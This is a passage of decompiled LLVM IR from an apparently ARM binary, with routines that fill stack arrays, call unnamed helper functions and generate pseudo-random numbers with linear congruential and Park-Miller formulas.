  store i32 %v2_101dc, i32* %r4.global-to-local, align 4
  store i32 %v3_101a4, i32* @r3, align 4
  store i32 %v0_1018c, i32* @r2, align 4
  store i32 %v2_101dc, i32* @r1, align 4
  %v0_101ec = call i32 @function_100f4()
  br label %dec_label_pc_101f0

dec_label_pc_101f0:                               ; preds = %dec_label_pc_10180, %dec_label_pc_10178, %dec_label_pc_101c4, %dec_label_pc_1018c, %dec_label_pc_101dc
  %v0_101f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_101f0, i32* %r5.global-to-local, align 4
  %v0_101f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_101f4 = inttoptr i32 %v0_101f0 to i32*
  store i32 %v0_101f4, i32* %v2_101f4, align 4
  br label %dec_label_pc_10214

dec_label_pc_1014c.dec_label_pc_101fc.loopexit_crit_edge: ; preds = %dec_label_pc_10144
  br label %dec_label_pc_101fc

dec_label_pc_101fc:                               ; preds = %dec_label_pc_10128, %dec_label_pc_1014c.dec_label_pc_101fc.loopexit_crit_edge, %dec_label_pc_1015c
  %v1_101fc = add i32 %v2_10130, -12
  store i32 %v1_101fc, i32* %r5.global-to-local, align 4
  %v3_10200 = inttoptr i32 %v1_101fc to i32*
  store i32 %arg3, i32* %v3_10200, align 4
  %v0_10204 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10204, i32* @r3, align 4
  %v0_10208 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10208, i32* @r2, align 4
  %v0_1020c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1020c, i32* @r1, align 4
  %v0_10210 = call i32 @function_100f4()
  br label %dec_label_pc_10214

dec_label_pc_10214:                               ; preds = %dec_label_pc_101f0, %dec_label_pc_101fc
  %v0_10214 = load i32, i32* %r5.global-to-local, align 4
  %v2_10218 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10218, i32* @r4, align 4
  ret i32 %v0_10214

; uselistorder directives
  uselistorder i32 %v3_101a4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_10168, { 1, 0 }
  uselistorder i32 %v3_10148, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10194, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_1018c, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_100f4, { 1, 0 }
  uselistorder i32 ()* @function_10114, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10214, { 1, 0 }
  uselistorder label %dec_label_pc_101fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_101f0, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1013c, { 1, 0 }
}

define i32 @function_1021c() local_unnamed_addr {
dec_label_pc_10238.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_1021c = ptrtoint i32* %stack_var_-268 to i32
  %v1_1022c = call i32 @function_10d4c()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_10238 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_10238

dec_label_pc_10238:                               ; preds = %dec_label_pc_10238.lr.ph, %dec_label_pc_10238
  %v1_1023c = phi i32 [ 31, %dec_label_pc_10238.lr.ph ], [ %v1_10248, %dec_label_pc_10238 ]
  %v4_1023c = mul i32 %v1_1023c, 4
  %v5_1023c = add i32 %v4_1023c, %v2_10238
  %v2_10244 = add i32 %v5_1023c, -128
  %v3_10244 = inttoptr i32 %v2_10244 to i32*
  store i32 0, i32* %v3_10244, align 4
  %v0_10248 = load i32, i32* %r1.global-to-local, align 4
  %v1_10248 = add i32 %v0_10248, -1
  store i32 %v1_10248, i32* %r1.global-to-local, align 4
  %v6_10248 = icmp slt i32 %v1_10248, 0
  br i1 %v6_10248, label %dec_label_pc_10250, label %dec_label_pc_10238

dec_label_pc_10250:                               ; preds = %dec_label_pc_10238
  %v2_10250 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_10250, i32* @r4, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_1025c = call i32 @function_136e0(i32 %v2_10250, i32 6)
  %v2_10260 = icmp eq i32 %v2_1025c, 0
  br i1 %v2_10260, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10250
  store i32 %v2_10250, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10250, %bb
  store i32 66164, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10260, i32 ptrtoint (i32* @global_var_11494.464 to i32))
  %v2_10278 = load i32, i32* @global_var_1aaa8.466, align 4
  %v2_1027c = icmp eq i32 %v2_10278, 0
  br i1 %v2_1027c, label %dec_label_pc_10284, label %dec_label_pc_102b4

dec_label_pc_10284:                               ; preds = %.thread1
  store i32 1, i32* @global_var_1aaa8.466, align 4
  br label %dec_label_pc_1028c

dec_label_pc_1028c:                               ; preds = %dec_label_pc_10304, %dec_label_pc_10284
  %v1_10298 = call i32 @function_10d4c()
  %v1_102a0 = call i32 @function_136a4(i32 6)
  store i32 66228, i32* @lr, align 4
  %v1_102b0 = call i32 @function_10d4c()
  %v2_102b8.pre = load i32, i32* @global_var_1aaa8.466, align 4
  br label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %.thread1, %dec_label_pc_1028c
  %v0_10328 = phi i32 [ %v2_10278, %.thread1 ], [ %v2_102b8.pre, %dec_label_pc_1028c ]
  store i32 ptrtoint (i32* @global_var_1aaa8.466 to i32), i32* %ip.global-to-local, align 4
  %v7_102bc = icmp eq i32 %v0_10328, 1
  br i1 %v7_102bc, label %dec_label_pc_102ec.lr.ph, label %dec_label_pc_10320

dec_label_pc_102ec.lr.ph:                         ; preds = %dec_label_pc_102b4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1aaa8.466, align 4
  %v2_102d8 = bitcast i32* %stack_var_-268 to i8*
  %v3_102d8 = call i32 @function_ef70(i8* %v2_102d8, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_102ec

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102ec.lr.ph, %dec_label_pc_102ec
  %v1_102f0 = phi i32 [ 31, %dec_label_pc_102ec.lr.ph ], [ %v1_102fc, %dec_label_pc_102ec ]
  %v4_102f0 = mul i32 %v1_102f0, 4
  %v5_102f0 = add i32 %v4_102f0, %v2_10238
  %v2_102f8 = add i32 %v5_102f0, -264
  %v3_102f8 = inttoptr i32 %v2_102f8 to i32*
  store i32 -1, i32* %v3_102f8, align 4
  %v0_102fc = load i32, i32* %r1.global-to-local, align 4
  %v1_102fc = add i32 %v0_102fc, -1
  store i32 %v1_102fc, i32* %r1.global-to-local, align 4
  %v6_102fc = icmp slt i32 %v1_102fc, 0
  br i1 %v6_102fc, label %dec_label_pc_10304, label %dec_label_pc_102ec

dec_label_pc_10304:                               ; preds = %dec_label_pc_102ec
  store i32 %v2_1021c, i32* %r1.global-to-local, align 4
  %v4_10318 = call i32 @function_11038(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_1028c

dec_label_pc_10320:                               ; preds = %dec_label_pc_102b4
  %v7_10320 = icmp eq i32 %v0_10328, 2
  br i1 %v7_10320, label %dec_label_pc_10328, label %dec_label_pc_10334

dec_label_pc_10328:                               ; preds = %dec_label_pc_10320
  store i32 3, i32* @global_var_1aaa8.466, align 4
  %v0_10330 = call i32 @function_1021c()
  %v2_10334.pre = load i32, i32* @global_var_1aaa8.466, align 4
  br label %dec_label_pc_10334

dec_label_pc_10334:                               ; preds = %dec_label_pc_10320, %dec_label_pc_10328
  %v1_1033c = phi i32 [ %v0_10328, %dec_label_pc_10320 ], [ %v2_10334.pre, %dec_label_pc_10328 ]
  %v7_10338 = icmp eq i32 %v1_1033c, 3
  br i1 %v7_10338, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_10334
  %v2_10344 = load i32, i32* %ip.global-to-local, align 4
  %v3_10344 = inttoptr i32 %v2_10344 to i32*
  store i32 4, i32* %v3_10344, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10334, %bb27
  call void @__pseudo_cond_branch(i1 %v7_10338, i32 ptrtoint (i32* @global_var_11248.468 to i32))
  br label %dec_label_pc_1034c

dec_label_pc_1034c:                               ; preds = %dec_label_pc_1034c, %.thread3
  %v0_1034c = call i32 @function_1021c()
  br label %dec_label_pc_1034c

; uselistorder directives
  uselistorder i32 %v1_102fc, { 2, 1, 0 }
  uselistorder i32 %v1_10248, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 7, 9, 8, 2 }
  uselistorder i32* @global_var_1aaa8.466, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_10334, { 1, 0 }
  uselistorder label %dec_label_pc_102ec, { 1, 0 }
  uselistorder label %dec_label_pc_102b4, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_10238, { 1, 0 }
}

define i32 @function_10364() local_unnamed_addr {
dec_label_pc_10364:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10368 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_18354.470 to i32), i32* @r4, align 4
  %v2_10370 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10370, i32* @r0, align 4
  %v1_10388 = call i32 @function_10d54()
  %v1_10398 = call i32 @function_10d4c()
  %v2_1039c = ptrtoint i32* %stack_var_-16 to i32
  %v3_103a4 = call i32 @function_10644(i32* inttoptr (i32 99180 to i32*), i32 %v2_1039c)
  store i32 %v2_10370, i32* @r0, align 4
  store i32 66492, i32* @lr, align 4
  %v1_103b8 = call i32 @function_10d54()
  %v3_103bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_10368, i32* @r4, align 4
  ret i32 %v3_103bc
}

define i32 @function_10508(i32 %arg1) local_unnamed_addr {
dec_label_pc_10508:
  %stack_var_-32 = alloca i32, align 4
  %v3_10508 = load i32, i32* @r4, align 4
  %v9_10508 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_18354.470 to i32), i32* @r4, align 4
  %v2_10510 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_10510, i32* @r0, align 4
  %v1_1052c = call i32 @function_10d54()
  store i32 66880, i32* @lr, align 4
  %v1_1053c = call i32 @function_10d4c()
  %v0_10540 = load i32, i32* @r6, align 4
  store i32 %v0_10540, i32* @r0, align 4
  %v2_10548 = inttoptr i32 %v0_10540 to i32*
  %v3_10548 = call i32 @function_106d4(i32* %v2_10548, i32 ptrtoint (i32* @global_var_1836c to i32))
  store i32 %v2_10510, i32* @r0, align 4
  %v1_10560 = call i32 @function_10d54()
  store i32 %v3_10508, i32* @r4, align 4
  store i32 %v9_10508, i32* @r6, align 4
  ret i32 %v1_10560
}

define i32 @function_10644(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10644:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_10644 = add i32 %tmp, 12
  %v2_10644 = inttoptr i32 %v1_10644 to i32*
  %v3_10644 = load i32, i32* %v2_10644, align 4
  store i32 %v3_10644, i32* %r3.global-to-local, align 4
  %v2_10648 = icmp eq i32 %v3_10644, 0
  %v3_1064c = load i32, i32* @r4, align 4
  store i32 %v3_1064c, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10658 = add i32 %tmp, 8
  %v2_10658 = inttoptr i32 %v1_10658 to i32*
  %v3_10658 = load i32, i32* %v2_10658, align 4
  store i32 %v3_10658, i32* %lr.global-to-local, align 4
  br i1 %v2_10648, label %dec_label_pc_10660, label %dec_label_pc_10684

dec_label_pc_10660:                               ; preds = %dec_label_pc_10644
  %v1_10660 = inttoptr i32 %v3_10658 to i32*
  %v2_10660 = load i32, i32* %v1_10660, align 4
  store i32 %v2_10660, i32* %r2.global-to-local, align 4
  %v2_10668 = mul i32 %v2_10660, 1103515245
  %v1_10670 = add i32 %v2_10668, 12345
  %tmp10 = bitcast i32 %v1_10670 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_10674 = bitcast float %tmp11 to i32
  store i32 %v1_10674, i32* %r3.global-to-local, align 4
  store i32 %v1_10674, i32* %v1_10660, align 4
  %v0_1067c = load i32, i32* %r3.global-to-local, align 4
  %v2_1067c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1067c, i32* %v2_1067c, align 4
  br label %dec_label_pc_106c8

dec_label_pc_10684:                               ; preds = %dec_label_pc_10644
  %v2_10684 = load i32, i32* %arg1, align 4
  store i32 %v2_10684, i32* %r2.global-to-local, align 4
  %v1_10688 = add i32 %tmp, 4
  %v2_10688 = inttoptr i32 %v1_10688 to i32*
  %v3_10688 = load i32, i32* %v2_10688, align 4
  store i32 %v3_10688, i32* %r0.global-to-local, align 4
  %v1_1068c = inttoptr i32 %v2_10684 to i32*
  %v2_1068c = load i32, i32* %v1_1068c, align 4
  store i32 %v2_1068c, i32* %r3.global-to-local, align 4
  %v1_10690 = inttoptr i32 %v3_10688 to i32*
  %v2_10690 = load i32, i32* %v1_10690, align 4
  %v4_10690 = add i32 %v3_10688, 4
  store i32 %v4_10690, i32* %r0.global-to-local, align 4
  %v2_10694 = add i32 %v2_10690, %v2_1068c
  store i32 %v2_10694, i32* %r3.global-to-local, align 4
  store i32 %v2_10694, i32* %v1_1068c, align 4
  %v3_10698 = load i32, i32* %r2.global-to-local, align 4
  %v4_10698 = add i32 %v3_10698, 4
  store i32 %v4_10698, i32* %r2.global-to-local, align 4
  %v0_1069c = load i32, i32* %ip.global-to-local, align 4
  %v1_1069c = add i32 %v0_1069c, 24
  %v2_1069c = inttoptr i32 %v1_1069c to i32*
  %v3_1069c = load i32, i32* %v2_1069c, align 4
  store i32 %v3_1069c, i32* %r4.global-to-local, align 4
  %v0_106a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_106a0 = udiv i32 %v0_106a0, 2
  store i32 %v3_106a0, i32* %r3.global-to-local, align 4
  %v3_106a4 = icmp ult i32 %v4_10698, %v3_1069c
  %v1_106a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_106a8 = inttoptr i32 %v1_106a8 to i32*
  store i32 %v3_106a0, i32* %v2_106a8, align 4
  br i1 %v3_106a4, label %dec_label_pc_106b8, label %bb

bb:                                               ; preds = %dec_label_pc_10684
  %v1_106ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_106ac, i32* %r2.global-to-local, align 4
  %v0_106b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_106b0, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_106b8:                               ; preds = %dec_label_pc_10684
  %v0_106b01 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_106b01, i32* %r3.global-to-local, align 4
  %v1_106b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_106b8 = icmp ult i32 %v0_106b01, %v1_106b8
  br i1 %v3_106b8, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_106b8
  store i32 %v0_106b01, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_106b8
  %v1_106c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_106c0, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_106c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_106c4 = inttoptr i32 %v0_106c4 to i32*
  %v2_106c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_106c4, i32* %v1_106c4, align 4
  %v3_106c4 = add i32 %v0_106c4, 4
  %v4_106c4 = inttoptr i32 %v3_106c4 to i32*
  %v5_106c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_106c4, i32* %v4_106c4, align 4
  br label %dec_label_pc_106c8

dec_label_pc_106c8:                               ; preds = %dec_label_pc_10660, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_106cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_106cc, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_106b01, { 1, 0, 2 }
  uselistorder i32 %v3_106a0, { 1, 0 }
  uselistorder i32 %v1_10674, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_106c8, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @function_106d4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_106d4:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_106d4 = load i32, i32* @r4, align 4
  store i32 %v3_106d4, i32* %stack_var_-32, align 4
  %v6_106d4 = load i32, i32* @r5, align 4
  %v1_106d8 = add i32 %tmp, 12
  %v2_106d8 = inttoptr i32 %v1_106d8 to i32*
  %v3_106d8 = load i32, i32* %v2_106d8, align 4
  %v2_106e0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp22 = icmp ugt i32 %v3_106d8, 4
  br i1 %tmp22, label %.dec_label_pc_1078c_crit_edge, label %dec_label_pc_106f0

.dec_label_pc_1078c_crit_edge:                    ; preds = %dec_label_pc_106d4
  br label %dec_label_pc_1078c

dec_label_pc_106f0:                               ; preds = %dec_label_pc_106d4
  %v0_106f0 = load i32, i32* @r0, align 4
  %v2_106f0 = icmp eq i32 %v0_106f0, 0
  %v1_106f4 = add i32 %tmp, 8
  %v2_106f4 = inttoptr i32 %v1_106f4 to i32*
  %v3_106f4 = load i32, i32* %v2_106f4, align 4
  store i32 %v3_106f4, i32* %r7.global-to-local, align 4
  br i1 %v2_106f0, label %bb, label %bb19

bb:                                               ; preds = %dec_label_pc_106f0
  store i32 1, i32* @r0, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_106f0, %bb
  %v0_10700 = phi i32 [ %v0_106f0, %dec_label_pc_106f0 ], [ 1, %bb ]
  %v2_106fc = icmp eq i32 %v3_106d8, 0
  %v2_10700 = inttoptr i32 %v3_106f4 to i32*
  store i32 %v0_10700, i32* %v2_10700, align 4
  br i1 %v2_106fc, label %dec_label_pc_10788, label %dec_label_pc_10708

dec_label_pc_10708:                               ; preds = %bb19
  %v1_10708 = add i32 %tmp, 16
  %v2_10708 = inttoptr i32 %v1_10708 to i32*
  %v3_10708 = load i32, i32* %v2_10708, align 4
  store i32 %v3_10708, i32* %sb.global-to-local, align 4
  %v0_1070c = load i32, i32* @r0, align 4
  store i32 %v0_1070c, i32* @r5, align 4
  %v0_10710 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10710, i32* %sl.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10748

dec_label_pc_1071c:                               ; preds = %dec_label_pc_10748
  %v2_1071c = call i32 @function_cafc(i32 %v0_1074c, i32 127773)
  store i32 127773, i32* @r1, align 4
  %v2_10728 = mul i32 %v2_1071c, 16807
  %v0_1072c = load i32, i32* @r5, align 4
  store i32 %v0_1072c, i32* @r0, align 4
  %v0_10730 = call i32 @function_14ea0()
  %tmp23 = mul i32 %v0_10730, -2836
  %v2_1073c = add i32 %v2_10728, %tmp23
  %v8_1073c = icmp slt i32 %v2_1073c, 0
  br i1 %v8_1073c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1071c
  %v2_10740 = add i32 %v2_1073c, 2147483647
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1071c, %bb20
  %storemerge = phi i32 [ %v2_10740, %bb20 ], [ %v2_1073c, %dec_label_pc_1071c ]
  %v0_10744 = phi i32 [ %v2_10740, %bb20 ], [ %v2_1073c, %dec_label_pc_1071c ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_10744 = load i32, i32* %sl.global-to-local, align 4
  %v2_10744 = add i32 %v1_10744, 4
  %v3_10744 = inttoptr i32 %v2_10744 to i32*
  store i32 %v0_10744, i32* %v3_10744, align 4
  %v4_10744 = load i32, i32* %sl.global-to-local, align 4
  %v5_10744 = add i32 %v4_10744, 4
  store i32 %v5_10744, i32* %sl.global-to-local, align 4
  %v0_10748.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10748.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_1074c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10748

dec_label_pc_10748:                               ; preds = %dec_label_pc_10708, %bb21
  %v0_1074c = phi i32 [ %v0_1070c, %dec_label_pc_10708 ], [ %v0_1074c.pre, %bb21 ]
  %v0_10760 = phi i32 [ %v3_10708, %dec_label_pc_10708 ], [ %v1_10748.pre, %bb21 ]
  %v0_10754 = phi i32 [ 1, %dec_label_pc_10708 ], [ %v0_10748.pre, %bb21 ]
  %v1_10754 = add i32 %v0_10754, 1
  store i32 %v1_10754, i32* %r8.global-to-local, align 4
  %v5_10758 = icmp slt i32 %v0_10754, %v0_10760
  br i1 %v5_10758, label %dec_label_pc_1071c, label %dec_label_pc_1075c

dec_label_pc_1075c:                               ; preds = %dec_label_pc_10748
  %v2_10760 = mul i32 %v0_10760, 10
  store i32 %v2_10760, i32* @r4, align 4
  %v0_10764 = load i32, i32* %r6.global-to-local, align 4
  %v1_10764 = add i32 %v0_10764, 20
  %v2_10764 = inttoptr i32 %v1_10764 to i32*
  %v3_10764 = load i32, i32* %v2_10764, align 4
  %v0_10768 = load i32, i32* %r7.global-to-local, align 4
  %v4_10768 = mul i32 %v3_10764, 4
  %v5_10768 = add i32 %v0_10768, %v4_10768
  %v1_1076c = inttoptr i32 %v0_10764 to i32*
  store i32 %v5_10768, i32* %v1_1076c, align 4
  %v3_1076c = add i32 %v0_10764, 4
  %v4_1076c = inttoptr i32 %v3_1076c to i32*
  %v5_1076c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_1076c, i32* %v4_1076c, align 4
  br label %dec_label_pc_10778

dec_label_pc_10774:                               ; preds = %dec_label_pc_10778
  %v0_1077c = load i32, i32* %r6.global-to-local, align 4
  %v2_10774 = inttoptr i32 %v0_1077c to i32*
  %v3_10774 = call i32 @function_10644(i32* %v2_10774, i32 %v2_106e0)
  br label %dec_label_pc_10778

dec_label_pc_10778:                               ; preds = %dec_label_pc_1075c, %dec_label_pc_10774
  %v0_10778 = load i32, i32* @r4, align 4
  %v1_10778 = add i32 %v0_10778, -1
  store i32 %v1_10778, i32* @r4, align 4
  %v6_10778 = icmp slt i32 %v1_10778, 0
  br i1 %v6_10778, label %dec_label_pc_10788, label %dec_label_pc_10774

dec_label_pc_10788:                               ; preds = %dec_label_pc_10778, %bb19
  %v2_10790.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_1078c

dec_label_pc_1078c:                               ; preds = %.dec_label_pc_1078c_crit_edge, %dec_label_pc_10788
  %v2_10790 = phi i32 [ %v3_106d4, %.dec_label_pc_1078c_crit_edge ], [ %v2_10790.pre, %dec_label_pc_10788 ]
  %v26_10790 = phi i32 [ -1, %.dec_label_pc_1078c_crit_edge ], [ 0, %dec_label_pc_10788 ]
  store i32 %v2_10790, i32* @r4, align 4
  store i32 %v6_106d4, i32* @r5, align 4
  ret i32 %v26_10790

; uselistorder directives
  uselistorder i32 %v1_10778, { 1, 0 }
  uselistorder i32 %v0_10764, { 1, 0, 2 }
  uselistorder i32 %v0_10754, { 1, 0 }
  uselistorder i32 %v2_1073c, { 0, 3, 2, 1 }
  uselistorder i32 %v3_106d8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_1078c, { 1, 0 }
  uselistorder label %dec_label_pc_10778, { 1, 0 }
  uselistorder label %dec_label_pc_10748, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_10794(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10794:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10794 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10794, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_10794
  %v1_10794 = load i32, i32* @r0, align 4
  %v2_10794 = load i32, i32* @r7, align 4
  %v5_10794 = udiv i32 %v2_10794, 8
  %v6_10794 = and i32 %v5_10794, %v1_10794
  store i32 %v6_10794, i32* @r4, align 4
  %v2_10798 = load i32, i32* @sp, align 4
  %v8_10798 = shl i32 %v2_10798, %arg4
  %v9_10798 = and i32 %v8_10798, %tmp
  call void @__pseudo_branch(i32 %v9_10798)
  %v0_1079c.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1079c.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v1_1079c = load i32, i32* @r0, align 4
  %v2_1079c = load i32, i32* @r4, align 4
  %v3_1079c = load i32, i32* @fp, align 4
  %v8_1079c = shl i32 %v2_1079c, %v3_1079c
  %v9_1079c = and i32 %v8_1079c, %v1_1079c
  store i32 %v9_1079c, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10794, %.thread, %bb
  %v3_107a4 = load i32, i32* @r4, align 4
  store i32 %v3_107a4, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp31 = icmp ult i32 %arg3, 128
  br i1 %tmp31, label %dec_label_pc_107c4, label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %.thread1
  %v2_107b4 = icmp ugt i32 %arg3, 254
  %v7_107b4 = icmp eq i32 %arg3, 255
  %v2_107b8 = xor i1 %v7_107b4, true
  %v3_107b8 = and i1 %v2_107b4, %v2_107b8
  br i1 %v3_107b8, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_107b4
  store i32 4, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_107b4, %bb22
  %v1_107ec9 = phi i32 [ %v3_107a4, %dec_label_pc_107b4 ], [ 4, %bb22 ]
  %v2_107bc = xor i1 %v2_107b4, true
  %v3_107bc = or i1 %v7_107b4, %v2_107bc
  br i1 %v3_107bc, label %bb24, label %bb28

bb24:                                             ; preds = %bb23
  store i32 3, i32* @r4, align 4
  br label %bb28

dec_label_pc_107c4:                               ; preds = %.thread1
  %tmp32 = icmp ugt i32 %arg3, 31
  br i1 %tmp32, label %dec_label_pc_107dc, label %dec_label_pc_107cc

dec_label_pc_107cc:                               ; preds = %dec_label_pc_107c4
  %tmp33 = icmp ugt i32 %arg3, 7
  br i1 %tmp33, label %.thread12, label %dec_label_pc_10848

.thread12:                                        ; preds = %dec_label_pc_107cc
  store i32 0, i32* @r4, align 4
  br label %bb28

dec_label_pc_107dc:                               ; preds = %dec_label_pc_107c4
  %v2_107dc = icmp ugt i32 %arg3, 62
  %v7_107dc = icmp eq i32 %arg3, 63
  %v2_107e0 = xor i1 %v7_107dc, true
  %v3_107e0 = and i1 %v2_107dc, %v2_107e0
  br i1 %v3_107e0, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_107dc
  store i32 2, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_107dc, %bb25
  %v1_107ec8 = phi i32 [ %v3_107a4, %dec_label_pc_107dc ], [ 2, %bb25 ]
